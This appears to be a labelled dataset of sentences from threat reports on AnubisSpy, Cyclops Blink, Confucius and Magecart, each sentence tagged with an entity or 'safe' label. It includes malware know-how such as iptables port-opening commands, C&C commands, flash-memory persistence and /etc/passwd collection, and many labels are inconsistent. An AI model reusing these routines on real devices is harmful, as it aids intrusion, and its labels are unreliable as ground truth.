label: safe

text: Android malware like ransomware exemplify how the platform can be lucrative for cybercriminals.
label: SOFTWARE

text: But there are also other threats stirring up as of late: attacks that spy on and steal data from specific targets, crossing over between desktops and mobile devices.
label: safe

text: These were published on Google Play — but have since been taken down — and third-party app marketplaces.
label: SOFTWARE

text: We named these malicious apps AnubisSpy (ANDROIDOS_ANUBISSPY) as all the malware’s payload is a package called watchdog.
label: malware

text: We construe AnubisSpy to be linked to the cyberespionage campaign Sphinx (APT-C-15) based on shared file structures and command-and-control (C&C) server as well as targets.
label: campaign

text: It’s also possible that while AnubisSpy’s operators may also be Sphinx’s, they could be running separate but similar campaigns.
label: campaign

text: What can AnubisSpy do?
label: malware

text: AnubisSpy can steal messages (SMS), photos, videos, contacts, email accounts, calendar events, and browser histories (i.e., Chrome and Samsung Internet Browser).
label: malware

text: It can also take screenshots and record audio, including calls.
label: safe

text: It can spy on the victim through apps installed on the device, a list of which is in its configuration file that can be updated.
label: safe

text: This includes Skype, WhatsApp, Facebook, and Twitter, among others.
label: SOFTWARE

text: After the data are collected, they are encrypted and sent to the (C&C) server.
label: safe

text: AnubisSpy can also self-destruct to cover its tracks.
label: malware

text: It can run commands and delete files on the device, as well as install and uninstall Android Application Packages (APKs).
label: safe

text: AnubisSpy has several modules, each of which has a separate role.
label: malware

text: AnubisSpy’s code is well constructed, indicating the developer/s’ know-how.
label: malware

text: Below is a visualization of the modules: Figure 1: Structure of AnubisSpy’s modules
label: malware

text: How is AnubisSpy related to Sphinx?
label: campaign

text: Sphinx reportedly uses the watering hole technique via social media sites to deliver its payloads — mainly a customized version of njRAT.
label: campaign

text: The Sphinx campaign operators cloaked the malware with icons of legitimate applications to dupe recipients into clicking them.
label: campaign

text: Sphinx was active between June 2014 and November 2015, but timestamps of the malware indicate the attacks started as early as 2011.
label: TIME

text: A simple WHOIS query of AnubisSpy’s C&C server showed it abused a legitimate managed hosting service provider in Belize.
label: location

text: We correlated the AnubisSpy variants to Sphinx’s desktop/PC-targeting malware through the following:  Shared C&C server, 86[.]105[.]18[.]107 Shared technique of decrypting JSON files, and similarity between the file structures of AnubisSpy and Sphinx’s malware Similar targets (highly concentrated in Middle Eastern countries)     Figure 2: Comparison of file structure in Sphinx’s desktop/PC-targeting malware (left) and AnubisSpy (right)
label: malware

text: Our coordination with Google also revealed that these apps were installed across a handful of countries in the Middle East.
label: identity

text: Was AnubisSpy actively distributed?
label: malware

text: We analyzed seven apps that were actually AnubisSpy.
label: malware

text: These were signed with the same fake Google certificates.
label: safe

text: We found two more apps created by the same developer, but they had no espionage-related codes; we think they were made as experimental projects.
label: safe

text: Based on hardcoded strings in the Agent Version, the malicious apps were developed as early as April 2015.
label: TIME

text: Timestamps indicate that the earliest sample was signed on June 2015; the latest variant was signed on May 2017.
label: TIME

text: AnubisSpy wasn’t only published on Google Play.
label: SOFTWARE

text: We also found versions of it in third-party app marketplaces, most likely as a way to expand the malware’s reach.
label: safe

text: The apps mainly used Middle East-based news and sociopolitical themes as social engineering hooks and abused social media to further proliferate.
label: attack-pattern

text: Versions of AnubisSpy posed as social news, promotional, healthcare, and entertainment apps.
label: malware

text: What does AnubisSpy mean to the mobile landscape?
label: malware

text: Persistent and furtive spyware is an underrated problem for the mobile platform.
label: safe

text: While cyberespionage campaigns on mobile devices may be few and far between compared to ones for desktops or PCs, AnubisSpy proves that they do indeed occur, and may have been more active than initially thought.
label: malware

text: Will mobile become cyberespionage’s main frontier?
label: safe

text: It won’t be a surprise given mobile platform’s increasing ubiquity, especially in workplaces.
label: safe

text: Beyond its effects, AnubisSpy also highlights the significance of proactively securing mobile devices, particularly if they’re on BYOD programs and used to access sensitive data.
label: malware

text: Enforcing the principle of least privilege and implementing an app reputation system are just some of the best practices that can help mitigate threats.
label: safe

text: We disclosed our findings to Google on October 12 and worked with Google on further analyzing the AnubisSpy-related apps.
label: TIME

text: Updates were also made to Google Play Protect to take appropriate action against those apps that have been verified as in violation of Google Play policy.
label: SOFTWARE

text: An in-depth technical analysis of AnubisSpy, along with indicators of compromise, is in this technical brief.
label: malware

text: Trend Micro Solutions End users and enterprises can also benefit from multilayered mobile security solutions such as Trend Micro™ Mobile Security which is also available on Google Play.
label: SOFTWARE

text: For organizations, Trend Micro™ Mobile Security for Enterprise provides device, compliance and application management, data protection, and configuration provisioning, as well as protects devices from attacks that leverage vulnerabilities, preventing unauthorized access to apps, as well as detecting and blocking malware and fraudulent websites.
label: SOFTWARE

text: Trend Micro’s Mobile App Reputation Service (MARS) covers Android and iOS threats using leading sandbox and machine learning technologies.
label: SOFTWARE

text: It can protect users against malware, zero-day and known exploits, privacy leaks, and application vulnerability.
label: safe

label: safe

text: Mobile

text: With additional insights from Philippe Z Lin Note: This article has been updated on March 17, 2022, 2:00 a.m. ET to include Asus’ security bulletin.
label: identity

text: Cyclops Blink, an advanced modular botnet that is reportedly linked to the Sandworm or Voodoo Bear advanced persistent threat (APT) group, has recently been used to target WatchGuard Firebox devices according to an analysis performed by the UK’s National Cyber Security Centre (NCSC).
label: malware

text: We acquired a variant of the Cyclops Blink malware family that targets Asus routers.
label: malware

text: This report discusses the technical capabilities of this Cyclops Blink malware variant and includes a list of more than 150 current and historical command-and-control (C&C) servers of the Cyclops Blink botnet.
label: malware

text: This list aims to aid cybersecurity defenders in searching for affected devices in their networks and starting the remediation process.
label: safe

text: We have reached out to Asus regarding our investigation, and they have created a security bulletin that includes a security checklist to help prevent Cyclops Blink attacks, as well as a list of affected Asus products.
label: malware

text: Our data also shows that although Cyclops Blink is a state-sponsored botnet, its C&C servers and bots affect WatchGuard Firebox and Asus devices that do not belong to critical organizations, or those that have an evident value on economic, political, or military espionage.
label: malware

text: Hence, we believe that it is possible that the Cyclops Blink botnet’s main purpose is to build an infrastructure for further attacks on high-value targets.
label: malware

text: Cyclops Blink has been around since at least June 2019, and a considerable number of its C&C servers and bots are active for up to about three years.
label: malware

text: The Sandworm APT group has been attributed as creating both Cyclops Blink and the VPNFilter internet of things (IoT) botnet.
label: threat-actor

text: VPNFilter, first discovered in 2018, targeted router and storage devices.
label: TIME

text: It was also reported to have infected hundreds of thousands of devices.
label: safe

text: In 2021, Trend Micro published a technical analysis of VPNFilter, which includes a discussion of how the botnet continues to affect infected systems two years after its discovery.
label: malware

text: Sandworm was also responsible for many high-profile attacks, including the 2015 and 2016 attacks on the Ukrainian electrical grid, the 2017 NotPetya attack, the 2017 French presidential campaign, the 2018 Olympic Destroyer attack on the Winter Olympic Games, and a 2018 operation against the Organization for the Prohibition of Chemical Weapons (OPCW).  Cyclops Blink malware analysis  Cyclops Blink is a modular malware written in the C language.
label: TIME

text: In its core component, the first thing that the malware does is to check if its executable file name starts with "[k".
label: safe

text: If it does not, it performs the following routine:   It redirects both stdout and stderr file descriptors to /dev/null.
label: FILEPATH

text: It sets the default handlers for SIGTERM, SIGINT, SIGBUS, SIGPIPE, and SIGIO signals.
label: safe

text: It reloads itself with a new "[ktest]" process name.
label: safe

text: It then waits for 37 seconds before it sets up its hard-coded parameters.
label: safe

text: These include the hard-coded C&C servers and the interval that should be used to communicate with the C&C servers.
label: safe

text: It also creates a pipe for inter-process communication (IPC) by calling the pipe() function for getting two file descriptors for reading and writing data.
label: safe

text: It also enables non-blocking I/O for the writing file descriptor by using ioctl().
label: safe

text: After this, a new data packet will be created in memory, which will then be sent to a C&C server.
label: safe

text: The details of this communication are covered later in this analysis.
label: safe

text: For every hard-coded TCP port used to communicate with the C&C servers, the malware creates a rule in Netfilter — the Linux kernel firewall — using the iptc_insert_entry() function from libiptc1 to allow output communication to it.
label: SOFTWARE

text: The rules have the following parameters:  Protocol: TCP Chain: filter Table: OUTPUT Action: ACCEPT
label: safe

text: Destination ports: 636, 994, and 995
label: safe

text: For an unknown reason, the malware deletes the aforementioned rules and creates them again, this time using the iptables command via the system() function.
label: safe

text: The commands are as follows:  iptables -D OUTPUT -p tcp --dport %d -j ACCEPT   iptables -I OUTPUT -p tcp --dport %d -j ACCEPT
label: safe

text: The OpenSSL library is then initialized, and the core component proceeds to initialize the hard-coded modules.
label: SOFTWARE

text: Modules initialization
label: safe

text: During this part, the core component initializes the modules.
label: safe

text: Communication with the modules is performed via pipes.
label: safe

text: For each hard-coded module, the malware creates two pipes before executing them in their own child processes.
label: safe

text: Figure 1.
label: safe

text: The function that initializes the modules      In Figure 1, we inferred the following mod_t structure:      Figure 2.
label: safe

text: Inferred mod_t structure; the last member is unknown.
label: safe

text: Parameters
label: safe

text: The parameters are then initialized.
label: safe

text: They consist of a 592-byte structure containing essential information sent to the modules via pipes.
label: safe

text: This information includes:  A “<p: ” string header   The pipe of the core component   All C&C IP addresses and ports   The local IP address   An interval for C&C server communication   When the next packet to be sent to a C&C server is   The main process PID   A hard-coded ID (we saw 0xA08F078B, 0xBD0A5B36, and 0xA244E5E2)   The parameters are pushed to the modules, which are initialized at this point.    C&C communication
label: safe

text: After obtaining data from the modules, the core component starts the encryption routines that will cipher the data before sending it to the C&C server.
label: safe

text: Encryption Cyclops Blink encrypts data using OpenSSL functions that should be available in the infected device as they are dynamically loaded.
label: tools

text: The data is encrypted using AES-256 in cipher block chaining (CBC) mode with a randomly generated 256-bit key and 128-bit initialization vector (IV).
label: safe

text: It is then encrypted using a hard-coded RSA-2560 (320-bit) public key unique to each sample.
label: safe

text: The malware authors decided to use the EVP_SealInit() function.
label: safe

text: This function performs all of the aforementioned encryption steps, including the random AES key and IV generation.
label: safe

text: The C&C server must have the corresponding RSA private key to decrypt the data.
label: safe

text: After encryption, if the total packet length is greater than 98,303 bytes, the packet is sent.
label: safe

text: Data transferring
label: safe

text: To send data to the C&C server, the core component performs a TLS handshake with a randomly chosen C&C server at a random TCP port, both of which are from a hard-coded list.
label: safe

text: After choosing an IP address and a TCP port pair, the core component creates a child process to perform the communication.
label: safe

text: The child process will connect to the C&C server and write four bytes to the SSL socket.
label: safe

text: These four bytes are the packet size that it wants to send.
label: safe

text: The child process writes four bytes to the SSL socket.
label: safe

text: The server must reply with an exact four-byte answer, which is the victim's IPv4 address.
label: safe

text: 10 bytes are then written to the core component pipe.
label: safe

text: The data follows a specific format.
label: safe

text: For example:   Packet length Target module Command Data (victim's IPv4 address) 00 00 00 0a 00 07 c0 a8 00 01
label: safe

text: The core component then receives more data from the C&C server.
label: safe

text: This time, it expects an encrypted packet to be decrypted using the hard-coded RSA-2560 public key.
label: safe

text: The malware expects a response where the first four bytes are the size of the packet followed by the encrypted data.
label: safe

text: Figure 4.
label: safe

text: Core component code that receives and decrypts data from the C&C server      If something is received, it is decrypted and written to the main pipe.
label: safe

text: For decryption, the malware uses the RSA_public_decrypt() function, which decrypts data encrypted with a corresponding private key, leveraging the “reversibility” of the RSA encryption algorithm.
label: safe

text: Finally, a variable containg the next time a packet should be sent is updated and all of the parameters are sent to the modules again.
label: safe

text: This is because the core component can receive new parameters from the C&C servers.
label: safe

text: Commands
label: safe

text: The data received from the C&C servers comprises either commands to the core component itself or to one of its modules.
label: safe

text: First, the core component sends the supported commands to the C&C server and then enters in a loop where it expects one of the commands.
label: safe

text: If a command targets the core component, it can be one of the following:   Command ID Action 0 Terminates the program 1 Bypasses the data-sending interval and sends data to C&C servers immediately 2 Adds a new C&C server to the list in memory 3 Sets time to send the next packet to the C&C server 4 Sets time to send the next packet to the C&C server 5 Adds a new module (an ELF file should be received following the command)
label: safe

text: 6 Reloads the malware 7 Sets the local IP address parameter 8 Sets a new worker ID 9 Sets an unknown byte value 10 Resends configuration to all running modules  Modules Asus (0x38)  This module can read and write from the devices' flash memory.
label: safe

text: The flash memory is used by these devices to store the operating system, configuration, and all files from the file system.
label: safe

text: Our research was carried out on the RT-AC68U, but other Asus routers such as RT-AC56U might be affected as well.
label: safe

text: It’s important to note, however, that since the malware is modular in nature, it can be easily recompiled to target any other device.
label: safe

text: The samples we’ve obtained work in the conditions mentioned in this report, but the malware actors seem ready to target any other router model or brand.
label: safe

text: In fact, this is what they have done with WatchGuard — it’s the same code, but it has been recompiled for the brand.  First, the module examines the content /proc/mtd file, which provides general information about the devices’ Memory Technology Device (MTD) subsystem.
label: SOFTWARE

text: The MTD provides an abstraction layer to access the device's flash memory.
label: safe

text: The malware looks for the strings “linux” and “rootfs” and reads it using a printf()-like format:      Figure 5.
label: safe

text: The module looks for “linux” and “rootfs” strings      The inferred mdt_data_t structure is as follows:      Figure 6.
label: safe

text: The mtd_data_t structure      The data is read to this structure.
label: safe

text: The content of /proc/mtd for an Asus RT-AC68U device is as follows:      Figure 7.
label: FILEPATH

text: Typical /proc/
label: FILEPATH

text: mtd
label: safe

text: from an Asus RT-AC68U router
label: safe

text: Therefore, for the case here, the malware would open /dev/mtd2, which is the partition where the Linux kernel image is stored.
label: FILEPATH

text: Why the malware authors decided to read either “linux” or “rootfs” partition is unclear.
label: safe

text: Based on our knowledge, they have quite different purposes.
label: safe

text: While the first holds the operating system, the second stores programs’ critical files, such as executables, data, and libraries.
label: safe

text: Cyclops Blink reads 80 bytes from the flash memory, writes it to the main pipe, and enters a loop to wait for a command to replace the partition content:      Figure 8.
label: malware

text: Asus module main loop     If the data coming from the core component starts with “<p:”, it means that it is a parameter for this module and 80 bytes will be written to the flash memory, effectively replacing its content.
label: safe

text: The writing is done by the j_save_data() function.
label: safe

text: It does this by correctly erasing the NAND eraseblocks first via ioctl() calls, and then writing the new content to them, as the following image shows:      Figure 9.
label: safe

text: Cyclops
label: malware

text: Blink
label: malware

text: Asus module code for writing to raw flash memory      As the flash memory content is permanent, this module can be used to establish persistence and survive factory resets.
label: safe

text: Although it cannot be used as proof of attribution, the preceding code reminded us of a routine from the third-stage code of VPNFilter’s process called “dstr” that was intended to “brick” the infected device.
label: malware

text: Apart from deleting many important files and even trying to delete the whole root file system, this particular VPNFilter stage also writes many 0xff bytes to the raw flash memory:
label: malware

text: Figure 10. VPNFilter “dstr” third-stage code for writing to raw flash memory      System reconnaissance (0x08) This module is responsible for sending information from the infected device to the C&C server.
label: malware

text: The following data is obtained from an infected device:    The Linux version, which the module gets by calling the uname() function and /etc/issue file   Information about the device’s memory consumption, which it gets by calling the sysinfo() function   The SSD storage information, which it gets by calling the statvfs() function  The content of the following files:  /etc/passwd /etc/group   /proc/mounts  /proc/partitions     Information about the network interfaces, which it gets by calling the if_nameindex() and iotctl() functions with the SIOCGIFHWADDR and SIOCGIFADDR commands.
label: FILEPATH

text: File download (0x0f) This module can download files from the internet.
label: safe

text: The DNS resolution is performed using DNS over HTTPS (DoH).
label: safe

text: The malware sends an HTTP POST request to a Google DNS Server (8.8.8.8) using the following headers:      Figure 11.
label: IPV4

text: HTTP POST request over SSL for DNS resolution      This module seems to be an earlier version of the same module (0x0f) that is used by the Cyclops Blink variant reported by NCSC.
label: malware

text: The main differences between the modules are as follows:    This module does not have an upload feature.    The 0x1 bit in the control flags is used in this module to specify if the download should be done via HTTPS.  Infrastructure
label: safe

text: We have been able to determine that the botnet of Cyclops Blink infected routers from both compromised WatchGuard devices and Asus routers.
label: malware

text: These compromised devices periodically connect to C&C servers that are themselves hosted on compromised WatchGuard devices.
label: safe

text: We have evidence that the routers of at least one vendor other than Asus and WatchGuard are connecting to Cyclops Blink C&Cs as well, but so far we have been unable to collect malware samples for this router brand.
label: malware

text: The botnet of Cyclops Blink has been around for some time.
label: malware

text: Using historical data of internet-wide scans and SSL certificate data, it is likely that Cyclops Blink dates back to at least June 2019.
label: malware

text: Since June 2019, the actor has issued more than 50 SSL certificates that were used on WatchGuard C&Cs on various TCP ports (as far as we are aware, the following TCP ports were used: 636, 989, 990, 994, 995, 3269, and 8443).
label: TIME

text: In Appendix A, we have listed both the live and inactive C&Cs used by Cyclops Blink for the benefit of network defenders.
label: malware

text: We have observed that some of the WatchGuard and Asus bots were never cleaned up because these routers still try to connect periodically to old C&Cs that were secured or taken offline.
label: safe

text: Figure 12.
label: safe

text: The timeline of several SSL certificates that were issued for Cyclops Blink C&Cs      Our investigation shows that there are more than 200 Cyclops Blink victims around the world.
label: malware

text: It should be noted that these victims do not appear to be evidently valuable targets for either economic, military, or political espionage.
label: safe

text: This is in line with the increasing number of brute-force attacks performed by other APT groups such as Pawn Storm, a group that has compromised numerous assets like email addresses and email servers of targets that are typically not aligned with Pawn Storm’s objectives.
label: threat-actor

text: Just like Pawn Storm, Sandworm is fishing with a wide net or looking to compromise assets on a larger scale.
label: threat-actor

text: Figure 13.
label: safe

text: The number of months that Cyclops Blink C&Cs have been live; it is important to note that live C&Cs during the time of reporting have been included.
label: malware

text: Conclusion and security recommendations
label: safe

text: Over the past few years, IoT attacks have been escalating globally and internet routers have been one of the primary targets.
label: safe

text: There are several reasons that these devices are favored by an attacker — the infrequency of patching, the lack of security software, and the limited visibility of defenders.
label: safe

text: Combined, these allow for the possibility of what we refer to as "eternal botnets."
label: safe

text: Once an IoT device is infected with malware, an attacker can have unrestricted internet access for downloading and deploying more stages of malware for reconnaissance, espionage, proxying, or anything else that the attacker wants to do.
label: safe

text: The underlying operating systems for the majority of IoT devices is Linux, which is also used by many powerful systems tools.
label: SOFTWARE

text: This can allow attackers to add anything else that they might need to complete their attacks.
label: safe

text: In the case of Cyclops Blink, we have seen devices that were compromised for over 30 months (about two and a half years) in a row and were being set up as stable C&C servers for other bots.
label: malware

text: The NCSC report covered malware targeting a specific vendor, namely WatchGuard.
label: identity

text: Based on our previous analysis of VPNFilter, we assumed that there were more vendors being attacked by this group.
label: malware

text: The vendors that were targeted by VPNFilter were Asus, D-Link, Huawei, Linksys, MikroTik, Netgear, QNAP, TP-Link, Ubiquiti, UPVEL, and ZDE.
label: identity

text: In the case of Cyclops Blink, we received samples targeting Asus routers that were not previously reported on.
label: malware

text: The Asus version of the Cyclops Blink malware that we have analyzed showed some differences compared to the WatchGuard versions that have been previously discussed.
label: malware

text: The samples that we have analyzed are compiled for ARM and are dynamically linked against uClibc.
label: safe

text: They also contain a module that specifically targets Asus routers.
label: safe

text: Asus is likely only one of the vendors that is currently being targeted by Cyclops Blink.
label: identity

text: We have evidence that other routers are affected too, but as of reporting, we were not able to collect Cyclops Blink malware samples for routers other than WatchGuard and Asus.
label: malware

text: Looking into the malware and the infrastructure being used by Cyclops Blinks actors gives us some clues about the other vendors that might be affected and how widespread this malware is.
label: malware

text: By sharing this additional technical observation, we aim to help network defenders, as well as those likely to be targeted by APT groups (such as Sandworm), gain a more complete picture of the Cyclops Blink campaign.
label: threat-actor

text: Based on our observation, we strongly believe that there are more targeted devices from other vendors.
label: safe

text: This malware is modular in nature and it is likely that each vendor has different modules and architectures that were thought out well by the Cyclops Blink actors.
label: malware

text: Moreover, the purpose of this botnet is still unclear: Whether it is intended to be used for distributed denial-of-service (DDoS) attacks, espionage, or proxy networks remains to be seen.
label: attack-pattern

text: But what is evident is that Cyclops Blink is an advanced piece of malware that focuses on persistence and the ability to survive domain sinkhole attempts and the takedown of its infrastructure.
label: malware

text: The APT group behind this malware has learned from its VPNFilter campaigns and continues to attack IoT devices such as routers.
label: malware

text: In the age of work-from-home (WFH) during the pandemic, it’s possible that espionage is part of the reason that IoT devices are still major targets for advanced attackers.
label: safe

text: The more routers are compromised, the more sources of powerful data collection — and avenues for further attacks — become available to attackers.
label: safe

text: Having a distributed infrastructure also makes it more difficult for cybersecurity teams to take down the whole attack.
label: safe

text: This is also why, after more than two years, there are still live VPNFilter hosts out there.
label: malware

text: Organizations can protect themselves from Cyclops Blink attacks by using strong passwords and re-examining their security measures.
label: malware

text: It is also important to ensure that only the services that absolutely need to be exposed to the internet are exposed.
label: safe

text: Access to these services should be limited, which can be achieved by configuring a virtual private network (VPN) that can access those services remotely.
label: safe

text: It’s also important to set reminders to check if devices such as routers, cameras, network-attached storage (NAS) devices, and other IoT devices have been patched or otherwise.
label: safe

text: If it is suspected that an organization’s devices have been infected with Cyclops Blink, it is best to get a new router.
label: malware

text: Performing a factory reset might blank out an organization’s configuration, but not the underlying operating system that the attackers have modified.
label: safe

text: If a particular vendor has firmware updates that can address a Cyclops Blink attack or any other weakness in the system, organizations should apply these as soon as possible.
label: malware

text: However, in some cases, a device might be an end-of-life product and will no longer receive updates from its vendor.
label: safe

text: In such cases, an average user would not have the ability to fix a Cyclops Blink infection.
label: malware

text: While the Cyclops Blink malware variant that we analyzed in this report is complicated in nature, one thing proves to be unmistakable when it comes to the Sandworm group that created it: Sandworm is a persistent and sophisticated group whose motives are clearly at odds with those that would be expected from groups that are primarily financially motivated.
label: threat-actor

text: Sandworm’s previous high-profile victims and their attacks’ substantial impact on these organizations are particularly worrying — even more so for a group that quickly learns from past errors, comes back stronger time and time again, and for whom international repercussions seem minimal at best.
label: threat-actor

text: The indicators of compromise (IOCs) can be found in this appendix and the C&C server validation script can be accessed via this text file.
label: safe

text: Tags  APT & Targeted Attacks | IoT | Research | Articles, News, Reports
label: safe

text: The Brazilian Central Bank recently announced that 2017 was the first year in which people did more banking using mobile devices than on PCs.
label: identity

text: There were 24.5 billion mobile banking transactions while there were 20.6 billion PC-based transactions.
label: safe

text: But, mobile banking use is picking up around the globe.
label: safe

text: As more people move to mobile banking, we believe attackers will focus their attacks away from PC banking and towards mobile banking.
label: safe

text: This means the risks of losing control of your accounts through mobile online banking are likely to increase.
label: safe

text: And that means the money in your accounts is at risk.
label: safe

text: Why should I care, what can it do to me?  Attackers are predictable: they follow people and money.
label: safe

text: It’s time to take precautions and start good mobile banking security habits.
label: safe

text: About  Threat Briefs are meant to help busy people understand real-world threats and how they can prevent them in their lives.
label: safe

text: They’re put together by Palo Alto Networks Unit 42 threat research team and are meant for you to read and share with your family, friends, and coworkers so you can all be safer and get on with the business of your digital life.  Got a topic you want us to write about for you, your friends, or your family?
label: identity

text: It’s quite odd (and probably underreported), however, to see it used as a vector for cyberespionage.
label: safe

text: We stumbled upon the Confucius hacking group while delving into Patchwork’s cyberespionage operations, and found a number of similarities.
label: threat-actor

text: Code in their custom malware bore similarities, for instance.
label: safe

text: Confucius targeted a particular set of individuals in South Asian countries, such as military personnel and businessmen, among others.
label: location

text: Are Patchwork and Confucius the same group?
label: threat-actor

text: The commands in their backdoors do resemble each other.
label: safe

text: The config files have a similar, custom structure, and both groups have infrastructure overlap.
label: safe

text: However, we construe them to be different groups, possibly within the same community, with different objectives and modi operandi.
label: safe

text: While Patchwork may be more straightforward with its predominantly malware-based attacks, Confucius’ can be inferred to be more nuanced, relying heavily on social engineering.
label: threat-actor

text: Exploiting the human psyche with chat apps Probing Confucius’ infrastructure, we came across websites offering Windows and Android chat applications, most likely iterations of its predecessor, Simple Chat Point: Secret Chat Point, and Tweety Chat.
label: SOFTWARE

text: We are admittedly uncertain of the extent — and success — of their use, but it’s one of the ingredients of the group’s operations.
label: safe

text: While the chat applications indeed have real chat features (although the communication is not anonymous, as advertised), they have backdoor routines and file-stealing behaviors that get triggered when specific words are sent to the app: collecting and harvesting all SMS messages, contacts, and accounts.
label: safe

text: Tweety Chat’s Android version can record audio, too.
label: SOFTWARE

text: Its latest version can mute the device (i.e., take out the ringtone and vibration features) and sync call logs and SMSs.
label: safe

text: We further tested Tweety Chat and saw red flags indicating their targets of interest: verification emails with a physical address whose postal code is assigned to a provincial capital that also appears (upon logging in) as a chat channel in Tweety Chat.
label: SOFTWARE

text: Figure 1: Tweety Chat’s interface (top), and code snippets showing the file types it steals (bottom) Romance in cyberespionage
label: SOFTWARE

text: The user list, chat room names, and content of the applications were stored in a remote server without any authentication.
label: safe

text: The chat logs shed light on the social engineering used by the operators to persuade victims to install the cyberespionage malware on their Android devices.
label: SOFTWARE

text: The first user and chatroom were created on August 27, 2017, and were probably the app authors’ testing ground.
label: TIME

text: The succeeding users and chatrooms were created on October 31 and December 12 the latest.
label: TIME

text: A certain hayat22 and love piqued our interest.
label: identity

text: hayat22, supposedly a female student, engaged in an online romance with a target whose handle was love, describing himself as living in South Asia working in garments manufacturing and wholesaling.
label: identity

text: Over the course of their correspondence, love suggested using WhatsApp to communicate.
label: SOFTWARE

text: hayat22 declined, saying she felt safer using Tweety Chat.
label: identity

text: love refused, but when hayat22 demurred and gave love an online cold shoulder, love tried installing Tweety Chat — and failed.
label: identity

text: He claimed that he wasn’t able to install the app.
label: safe

text: hayat22 quickly lost interest and stopped replying to him altogether.
label: identity

text: She also sent him a screenshot to show what Tweety Chat looked like.
label: SOFTWARE

text: We’re not sure how love wound up in the chat room or how he met hayat22.
label: identity

text: He was probably either using the Windows version of Secret Chat Point or its web interface, which explains why hayat22 was urging him to install Android Tweety Chat.
label: SOFTWARE

text: In an earlier chat group, an operator called Heena urged the members to install Secret Chat Point on other people’s mobile devices to get perks like credits or the ability to “go invisible”.
label: identity

text: In another chat room called “Maira’s room”, a target of interest disclosed he was a government officer traveling back from a northern city near the country’s provincial capital.
label: safe

text: A few days after, the operator stopped answering in the chat room, and her user account was deleted from the server.
label: safe

text: Figure 2: ByeBye Shell’s interface showing Confucius’ campaigns  Figure 3: Screenshot showing a group chat where the moderator is urging users to install Tweety Chat  Figure 4: Screenshot showing Tweety Chat promoted in social media
label: threat-actor

text: A tangled web of malware
label: safe

text: Confucius’ operations include deploying bespoke backdoors and stealing files from their victim’s systems with tailored file stealers, some of which bore resemblances to Patchwork’s.
label: threat-actor

text: The stolen files are then exfiltrated by abusing a cloud storage service.
label: safe

text: Some of these file stealers specifically target files from USB devices, probably to overcome air-gapped environments.
label: safe

text: Compared to Patchwork, whose Trojanized documents exploit at least five security flaws, Confucius’ backdoors are delivered through Office files exploiting memory corruption vulnerabilities CVE-2015-1641 and CVE-2017-11882.
label: attack-pattern

text: Their malware’s resemblance to that of Patchwork’s is also notable.
label: threat-actor

text: The use of an exploit for a security flaw disclosed in December 2017 and their recent activities suggest Confucius is keenly trailing their targets.
label: TIME

text: Confucius has a miscellany of backdoors: sctrls, ByeBye Shell, remote-access-c3, and sip_telephone, to name a few.
label: malware

text: One of its file stealers, swissknife2, abuses a cloud storage service as a repository of exfiltrated files.
label: malware

text: At the time of research, there were around 60 victims whose data were uploaded to Confucius-owned cloud storage account.
label: threat-actor

text: There were also a few thousand files in the account that were later deleted.
label: safe

text: Our research, Deciphering Confucius: A Look at the Group’s Cyberespionage Operations, delves into the group’s operations, the social engineering methods and gamut of malware it uses, and the countermeasures that organizations can adopt to mitigate them.
label: threat-actor

text: The list of indicators of compromise, which includes Trend Micro’s corresponding detections and solutions, is in this appendix.
label: identity

text: "A few weeks ago, British Airways was hit by the largest ever regulatory fine of its kind, after global customers visiting its website had their card data stolen.
label: identity

text: The $228m penalty levied by the UK’s privacy watchdog reflects the seriousness of the attack and the carrier’s failure to protect its customer’s personal and financial information.
label: identity

text: However, this incident has repercussions way beyond the UK airline and its customers.
label: safe

text: It’s part of a new wave of attacks designed to implant “digital skimming” code on e-commerce sites, in order to siphon off your card details as they are entered in to pay for goods.
label: safe

text: Although tens of thousands of websites have been caught out in this way, there are things you can do to stay safe—most notably by running Trend Micro Security.
label: identity

text: But first, here’s more on what you need to know.
label: safe

text: The story so far
label: safe

text: Data breaches are so often in the news headlines today, that you could be forgiven for becoming a little desensitized.
label: safe

text: From retailers like Target and Home Depot to government breaches at agencies including the Office of Personnel Management (OPM), and from financial organizations like Equifax to tech giants like Yahoo, billions of our personal records have been stolen by cyber-thieves over the past few years.
label: identity

text: Yet in all of these cases, there has been little the customer could do about it.
label: safe

text: That’s because the hackers target the organization directly.
label: safe

text: They find ways to bypass its security controls and sneak inside the company networks to find what they’re looking for: usually databases full of customer data.
label: safe

text: A new type of data breach
label: safe

text: However, these new digital skimming attacks are different.
label: safe

text: In what way?
label: safe

text: They involve a hacker deploying malicious code known as Magecart to an organization’s website.
label: malware

text: This code is typically designed to stay hidden, under the radar of the company.
label: safe

text: And it has a very specific purpose: to steal customer card details as they are entered into the site during payment.
label: safe

text: In short, it’s the digital equivalent of those physical skimming devices that criminals insert into ATMs to steal card data as it’s entered: it’s highly effective and happens completely without the knowledge of the cardholder.
label: safe

text: By using this method, the hackers get access to the full card details, which have a higher resale value on the cybercrime black market.
label: safe

text: The problem (for them) with the more traditional types of attack targeting back-end databases, is that these organizations may store card data encrypted, or else minus the crucial CVV/CV2 code.
label: safe

text: Magecart attacks get around that.
label: malware

text: What sites are at risk?
label: safe

text: Indeed, the Magecart attackers have proven over the past year that no website is safe from skimming attacks.
label: malware

text: Whether it’s a big-name e-commerce brand like Newegg, a national airline, a global ticketing site (Ticketmaster), or even online campus stores serving nearly 200 universities in the US and Canada–as long as they accept online payments, they’re at risk.
label: identity

text: Magecart is so effective that multiple groups are said to be using the code, a piece of malicious JavaScript, to infect websites around the world.
label: malware

text: And they’re developing new tools and tactics all the time to improve their monetization.
label: safe

text: These include:     Infecting third-party companies which supply code to other sites (e.g., those that provide online ad services).
label: safe

text: Thus, with just one attack, the hackers can get their Magecart code onto potentially thousands of payment pages.
label: malware

text: Using automated tools to scan the internet for companies that may be running unsecured servers, which they can then infect with Magecart.
label: safe

text: Some 17,000 sites were recently compromised in this way.
label: safe

text: In a separate attack, 962 online stores were hit in just 24 hours.
label: safe

text: Developing new skimming code which is usable across as many different payment pages as possible.
label: attack-pattern

text: The record is 57 different payment gateways, which makes the hackers’ job much easier as they can launch attack campaigns across the globe with the same tools            All this is bad news for online shoppers.
label: safe

text: So how do you know that the site you’re entering card data into is safe?
label: safe

text: What can you do to stay safe?
label: safe

text: Unfortunately, there’s nothing obvious that differentiates a website infected with Magecart from any other site.
label: malware

text: It will look completely normal and will allow you to pay in the usual manner.
label: safe

text: The only difference is that, in the background, a tiny piece of code will be stealing your data and transferring it to the hackers.
label: safe

text: So what can you do to protect yourself?
label: safe

text: You could try to avoid smaller sites that may not have the same level of security as larger ones.
label: safe

text: However, as we’ve seen, Magecart has hit big-name brands as well as less well-known companies.
label: malware

